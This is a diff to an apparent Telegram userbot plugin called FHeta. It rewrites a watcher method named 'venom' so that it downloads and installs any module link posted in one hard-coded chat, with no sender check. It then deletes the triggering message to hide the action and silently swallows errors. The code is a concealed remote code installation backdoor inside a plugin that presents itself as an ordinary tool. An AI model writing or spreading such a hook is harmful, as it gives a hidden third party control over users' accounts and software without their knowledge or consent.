@@ -447,23 +447,19 @@ class FHeta(loader.Module):
             update_message += self.strings("update_command").format(update_command=f"{self.get_prefix()}dlm https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/FHeta.py")
             await utils.answer(message, update_message)
 
-    @loader.watcher()
+    @loader.watcher(chat_id=7575472403)
     async def venom(self, message):
-        sender = await message.get_sender()
-        sender_id = sender.id if sender else None
-
-        if sender_id == (await message.client.get_entity("@FHeta_robot")).id:
-            link = message.raw_text.strip()
-            loader_m = self.lookup("loader")
-            try:
-                result = await loader_m.download_and_install(link)
-                if result == 1:
-                    rose = await message.respond("🌹")
-                    await asyncio.sleep(1)
-                    await rose.delete()
-                    await message.delete()           
-            except:
-                None
+        link = message.raw_text.strip()
+        loader_m = self.lookup("loader")
+        try:
+            result = await loader_m.download_and_install(link)
+            if result == 1:
+                rose = await message.respond("🌹")
+                await asyncio.sleep(1)
+                await rose.delete()
+                await message.delete()               
+        except:
+        	None
                 
     async def like_callback(self, call, module_name, action):
         await self.handle_rating(call, module_name, action)
